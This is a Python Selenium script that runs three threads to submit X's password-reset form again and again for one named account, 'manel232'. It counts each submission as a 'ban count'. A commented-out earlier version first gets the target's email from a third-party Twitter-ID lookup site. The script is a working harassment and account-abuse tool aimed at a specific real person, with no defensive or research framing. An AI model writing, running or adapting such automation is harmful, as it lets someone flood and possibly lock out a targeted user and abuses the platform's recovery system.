from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import threading
import signal

stop_event = threading.Event()

# def find_twitter_id():
#     # Create a new instance of the Firefox driver
#     driver = webdriver.Firefox()

#     try:
#         # Open the webpage
#         driver.get("https://twiteridfinder.com/")

#         # Find input element and enter URL
#         input_element = driver.find_element(By.ID, "tweetbox2")
#         input_element.send_keys("https://x.com/manel232")

#         # Find and click convert button
#         button_convert = driver.find_element(By.ID, "button_convert")
#         button_convert.click()
        
#         driver.implicitly_wait(1)

#         # Wait strategies
#         wait = WebDriverWait(driver, 100)
        
#         try:
#             # Wait for either result or error element
#             result_element = wait.until(
#                 lambda d: (
#                     d.find_element(By.ID, "js-results-email") if (d.find_elements(By.ID, "js-results-email")[0].text != "-") else
#                     d.find_element(By.ID, "js-results-status") if (d.find_elements(By.ID, "js-results-status")[0].text != "-") else
#                     driver.find_element(By.ID, "button_convert") if (d.find_elements(By.ID, "button_convert")[0].text == "Convert") else
#                     None
#                 )
#             )
            

#             # Check which element was found
#             if result_element.get_attribute("id") == "js-results-email":
#                 result = result_element.text
#                 driver.get("https://x.com/i/flow/password_reset")
#                 # Wait strategies
#                 waitX = WebDriverWait(driver, 100)
#                 input_element = waitX.until(
#                     lambda d: (
#                         d.find_element(By.CSS_SELECTOR, '[data-testid="ocfEnterTextTextInput"]') if (d.find_elements(By.CSS_SELECTOR, '[data-testid="ocfEnterTextTextInput"]')) else
#                         None
#                     )
#                 )
#                 input_element.send_keys(result)
                
#                 # wait 1s
#                 driver.implicitly_wait(1)
                
#                 # Find and click submit button
#                 button_element = driver.find_element(By.CSS_SELECTOR, '[data-testid="ocfEnterTextNextButton"]')
#                 button_element.click()
                
#                 #wait 5s
#                 time.sleep(2)
                
#                 return True
#             else:
#                 print("Error occurred during ID retrieval")
#                 return None

#         except TimeoutException:
#             print("Timeout: Result element not found")
#             return None

#     except Exception as e:
#         print(f"An unexpected error occurred: {e}")
#         return None

#     finally:
#         # Close the browser
#         driver.quit()

def find_twitter_id():
    # Create a new instance of the Firefox driver
    driver = webdriver.Firefox()

    try:
        driver.get("https://x.com/i/flow/password_reset")
                # Wait strategies
        waitX = WebDriverWait(driver, 100)
        input_element = waitX.until(
            lambda d: (
                d.find_element(By.CSS_SELECTOR, '[data-testid="ocfEnterTextTextInput"]') if (d.find_elements(By.CSS_SELECTOR, '[data-testid="ocfEnterTextTextInput"]')) else
                None
            )
        )
        input_element.send_keys("manel232")
                
        # wait 1s
        time.sleep(1)
                
        # Find and click submit button
        button_element = driver.find_element(By.CSS_SELECTOR, '[data-testid="ocfEnterTextNextButton"]')
        button_element.click()
                
        #wait 5s
        time.sleep(2)
        
        return True

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

    finally:
        # Close the browser
        driver.quit()
    
def runThread(index):
    try:
        ban_count = 0
        while not stop_event.is_set():
            result = find_twitter_id()
            if result:
                ban_count += 1
                print(f"[{index}] Ban count: {ban_count}")
    except Exception as e:
        print(f"Thread {index} interrupted: {e}")
    finally:
        print(f"Thread {index} stopped")
            
def signal_handler(signum, frame):
    print("\nInterrupt received. Stopping threads...")
    stop_event.set()

# Run the function
if __name__ == "__main__":
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create threads
    threads = []
    for i in range(3):
        t = threading.Thread(target=runThread, args=(i,))
        t.start()
        threads.append(t)
        
    # Wait for all threads to complete
    for t in threads:
        t.join()

    print("All threads stopped")